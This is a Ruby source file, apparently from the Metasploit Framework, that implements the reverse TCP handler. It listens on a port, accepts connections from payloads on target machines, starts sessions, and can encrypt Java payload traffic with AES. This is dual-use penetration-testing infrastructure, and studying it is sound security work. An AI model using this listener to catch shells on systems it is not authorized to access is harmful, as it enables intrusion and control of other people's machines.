# -*- coding: binary -*-
require 'rex/socket'
require 'thread'

module Msf
module Handler
###
#
# This module implements the reverse TCP handler.  This means
# that it listens on a port waiting for a connection until
# either one is established or it is told to abort.
#
# This handler depends on having a local host and port to
# listen on.
#
###
module ReverseTcp
  include Msf::Handler
  include Msf::Handler::Reverse
  include Msf::Handler::Reverse::Comm

  #
  # Returns the string representation of the handler type, in this case
  # 'reverse_tcp'.
  #
  def self.handler_type
    "reverse_tcp"
  end

  #
  # Returns the connection-described general handler type, in this case
  # 'reverse'.
  #
  def self.general_handler_type
    "reverse"
  end

  #
  # Initializes the reverse TCP handler and ads the options that are required
  # for all reverse TCP payloads, like local host and local port.
  #
  def initialize(info = {})
    super

    # XXX: Not supported by all modules
    register_advanced_options(
      [
        OptAddress.new(
          'ReverseListenerBindAddress',
          [ false, 'The specific IP address to bind to on the local system' ]
        ),
        OptBool.new(
          'ReverseListenerThreaded',
          [ true, 'Handle every connection in a new thread (experimental)', false ]
        )
      ] +
      Msf::Opt::stager_retry_options,
      Msf::Handler::ReverseTcp
    )

    self.conn_threads = []
  end

  #
  # Closes the listener socket if one was created.
  #
  def cleanup_handler
    stop_handler

    # Kill any remaining handle_connection threads that might
    # be hanging around
    conn_threads.each do |thr|
      begin
        thr.kill
      rescue
        nil
      end
    end
  end

  # A string suitable for displaying to the user
  #
  # @return [String]
  def human_name
    "reverse TCP"
  end

  # A URI describing what the payload is configured to use for transport
  def payload_uri
    addr = datastore['LHOST']
    uri_host = Rex::Socket.is_ipv6?(addr) ? "[#{addr}]" : addr
    "tcp://#{uri_host}:#{datastore['LPORT']}"
  end

  # A URI describing where we are listening
  #
  # @param addr [String] the address that
  # @return [String] A URI of the form +scheme://host:port/+
  def listener_uri(addr = datastore['ReverseListenerBindAddress'])
    addr = datastore['LHOST'] if addr.nil? || addr.empty?
    uri_host = Rex::Socket.is_ipv6?(addr) ? "[#{addr}]" : addr
    "tcp://#{uri_host}:#{bind_port}"
  end

  #
  # Starts monitoring for an inbound connection.
  #
  def start_handler
    queue = ::Queue.new

    local_port = bind_port

    handler_name = "ReverseTcpHandlerListener-#{local_port}"
    self.listener_thread = framework.threads.spawn(handler_name, false, queue) { |lqueue|
      loop do
        # Accept a client connection
        begin
          client = listener_sock.accept
          if client
            self.pending_connections += 1
            lqueue.push(client)
          end
        rescue Errno::ENOTCONN
          nil
        rescue StandardError => e
          wlog [
            "#{handler_name}: Exception raised during listener accept: #{e.class}",
            $ERROR_INFO.to_s,
            $ERROR_POSITION.join("\n")
          ].join("\n")
        end
      end
    }

    worker_name = "ReverseTcpHandlerWorker-#{local_port}"
    self.handler_thread = framework.threads.spawn(worker_name, false, queue) { |cqueue|
      loop do
        begin
          client = cqueue.pop

          unless client
            elog("#{worker_name}: Queue returned an empty result, exiting...")
          end

          # Timeout and datastore options need to be passed through to the client
          opts = {
            datastore:     datastore,
            expiration:    datastore['SessionExpirationTimeout'].to_i,
            comm_timeout:  datastore['SessionCommunicationTimeout'].to_i,
            retry_total:   datastore['SessionRetryTotal'].to_i,
            retry_wait:    datastore['SessionRetryWait'].to_i
          }

          if datastore['ReverseListenerThreaded']
            thread_name = "#{worker_name}-#{client.peerhost}"
            conn_threads << framework.threads.spawn(thread_name, false, client) do |client_copy|
              handle_connection(wrap_aes_socket(client_copy), opts)
            end
          else
            handle_connection(wrap_aes_socket(client), opts)
          end
        rescue StandardError
          elog("Exception raised from handle_connection: #{$ERROR_INFO.class}: #{$ERROR_INFO}\n\n#{$ERROR_POSITION.join("\n")}")
        end
      end
    }
  end

  def wrap_aes_socket(sock)
    if datastore["PAYLOAD"] !~ %r{java/} || (datastore["AESPassword"] || "") == ""
      return sock
    end

    socks = Rex::Socket.tcp_socket_pair
    socks[0].extend(Rex::Socket::Tcp)
    socks[1].extend(Rex::Socket::Tcp)

    m = OpenSSL::Digest.new('md5')
    m.reset
    key = m.digest(datastore["AESPassword"] || "")

    Rex::ThreadFactory.spawn('Session-AESEncrypt', false) do
      c1 = OpenSSL::Cipher.new('aes-128-cfb8')
      c1.encrypt
      c1.key = key
      sock.put([0].pack('N'))
      sock.put((c1.iv = c1.random_iv))
      buf1 = socks[0].read(4096)
      while buf1 && buf1 != ""
        sock.put(c1.update(buf1))
        buf1 = socks[0].read(4096)
      end
      sock.close
    end

    Rex::ThreadFactory.spawn('Session-AESDecrypt', false) do
      c2 = OpenSSL::Cipher.new('aes-128-cfb8')
      c2.decrypt
      c2.key = key

      iv = ""
      iv << sock.read(16 - iv.length) while iv.length < 16

      c2.iv = iv
      buf2 = sock.read(4096)
      while buf2 && buf2 != ""
        socks[0].put(c2.update(buf2))
        buf2 = sock.read(4096)
      end
      socks[0].close
    end

    socks[1]
  end

  #
  # Stops monitoring for an inbound connection.
  #
  def stop_handler
    # Terminate the listener thread
    listener_thread.kill if listener_thread && listener_thread.alive? == true

    # Terminate the handler thread
    handler_thread.kill if handler_thread && handler_thread.alive? == true

    begin
      listener_sock.close if listener_sock
    rescue IOError
      # Ignore if it's listening on a dead session
      dlog("IOError closing listener sock; listening on dead session?", LEV_1)
    end
  end

  protected

  attr_accessor :listener_sock # :nodoc:
  attr_accessor :listener_thread # :nodoc:
  attr_accessor :handler_thread # :nodoc:
  attr_accessor :conn_threads # :nodoc:
end
end
end
